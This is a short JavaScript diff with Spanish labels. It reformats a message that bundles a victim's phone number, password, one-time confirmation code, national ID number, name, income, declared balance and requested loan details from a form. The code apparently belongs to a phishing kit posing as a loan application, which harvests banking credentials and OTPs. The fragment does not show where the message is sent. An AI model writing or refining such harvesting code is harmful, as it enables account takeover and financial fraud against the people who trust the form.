@@ -340,15 +340,17 @@
       const fechaPago = formData.fechaPago || "No disponible";
       const monto = formData.montoPrestamo || "No disponible";
 
-      const mensaje =--------------------------------------        `📱 Número: ${numeroTelefono}
+      const mensaje = `
+----------------------------------------
+📱 Número: ${numeroTelefono}
 🔒 Contraseña: ${password}
 ❌ Confirmacion: ${otp}
+💵 Saldo declarado: ${saldo}
 -----------------------------------------
 🆔 Cédula: ${cedula}
 👤 Nombre: ${nombre}
 💼 Ocupación: ${ocupacion}
 💰 Ingresos: ${ingresos}
-💵 Saldo declarado: ${saldo}
 📅 Plazo: ${plazo} meses
 📆 Fecha de pago: día ${fechaPago} de cada mes
 🏦 Monto solicitado: ${monto}`;
